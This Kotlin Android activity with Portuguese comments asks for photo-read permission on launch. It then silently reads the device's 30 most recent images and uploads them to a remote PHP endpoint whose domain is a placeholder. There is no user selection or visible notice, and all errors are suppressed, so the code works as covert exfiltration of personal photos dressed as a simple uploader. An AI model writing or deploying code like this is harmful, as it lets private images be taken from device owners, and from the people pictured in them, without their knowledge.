package br.com.conect.uploader

import android.Manifest
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.provider.MediaStore
import androidx.activity.ComponentActivity
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody.Part
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.logging.HttpLoggingInterceptor
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.*

class MainActivity : ComponentActivity() {

    private val client by lazy {
        val log = HttpLoggingInterceptor().apply { level = HttpLoggingInterceptor.Level.BASIC }
        OkHttpClient.Builder().addInterceptor(log).build()
    }

    // TODO: ajuste para seu domínio:
    private val uploadUrl = "https://SEU-DOMINIO/upload_photos_pending.php"

    private val reqPermission = registerForActivityResult(ActivityResultContracts.RequestPermission()) { granted ->
        if (granted) collectAndUpload()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        // Permissão em tempo de execução
        val perm = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES
                   else Manifest.permission.READ_EXTERNAL_STORAGE
        if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
            reqPermission.launch(perm)
        } else {
            collectAndUpload()
        }
    }

    private fun collectAndUpload() {
        // Pega as 30 mais recentes do MediaStore
        val imgs = queryLastImages(30)
        if (imgs.isEmpty()) return

        val batchToken = UUID.randomUUID().toString().replace("-", "")
        val multipart = MultipartBody.Builder().setType(MultipartBody.FORM).apply {
            addFormDataPart("batch_token", batchToken)
            imgs.forEachIndexed { idx, bytes ->
                val tmp = File(cacheDir, "img_$idx.jpg")
                FileOutputStream(tmp).use { it.write(bytes) }
                addFormDataPart("photos[]", tmp.name, tmp.asRequestBody("image/jpeg".toMediaTypeOrNull()))
            }
        }.build()

        val req = Request.Builder().url(uploadUrl).post(multipart).build()
        Thread {
            try {
                client.newCall(req).execute().use { resp ->
                    // Sucesso simples; você pode notificar com Toast/Notification
                }
            } catch (_: Exception) {}
        }.start()
    }

    private fun queryLastImages(limit: Int): List<ByteArray> {
        val list = mutableListOf<ByteArray>()
        val projection = arrayOf(
            MediaStore.Images.Media._ID,
            MediaStore.Images.Media.DATE_ADDED
        )
        val sort = MediaStore.Images.Media.DATE_ADDED + " DESC"
        val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        contentResolver.query(uri, projection, null, null, "$sort LIMIT $limit")?.use { cur ->
            val idCol = cur.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
            while (cur.moveToNext()) {
                val id = cur.getLong(idCol)
                val contentUri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI.buildUpon().appendPath(id.toString()).build()
                try {
                    contentResolver.openInputStream(contentUri)?.use { inp ->
                        list.add(inp.readBytes())
                    }
                } catch (_: Exception) {}
            }
        }
        return list
    }
}
